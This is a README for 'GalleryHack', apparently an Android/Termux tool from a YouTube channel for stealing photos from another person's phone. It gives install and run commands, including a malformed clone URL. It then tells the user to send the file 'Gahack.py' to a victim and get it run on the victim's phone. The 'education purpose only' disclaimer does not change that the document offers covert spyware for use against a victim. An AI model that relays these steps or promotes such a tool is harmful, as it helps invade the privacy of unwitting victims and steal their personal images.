# GalleryHack
## Termux Users Gallery Hack Tool (Owner - Gihan 2003 | SL TECH PODDA | Sri Lanka 🇱🇰 
### Command list 👇👇

>pkg update && pkg upgrade

>pkg install git

>git clone https://github.com/Gihan 2003/GalleryHack.git

>cd GalleryHack

>python galleryhack.py

>Sent To victim Gahack.py File And Run Victim's Phone 

## Type Victim's phone :-  python Gahck.py

#                         Welcome To Sl Tech Podda Youtube Channel

                                    💢 Disclaimer 💢
SL ANDROID Channel Doesn't Promote & Encourage Any illegal Activities, SL ANDROID YouTube Channel All Contents Only Provided  by Education &Purpose Only. Thanks for watching.

🔗 Follow Us On Facebook Page 
https://mtouch.facebook.com/SL-TECH-PODDA-100985485169584/?ref=bookmarks

🔗 Subscribe My youtube Channel https://m.youtube.com/channel/UClNqEbsGgI6pDj9k0g3gtzg

## Thak you very mutch
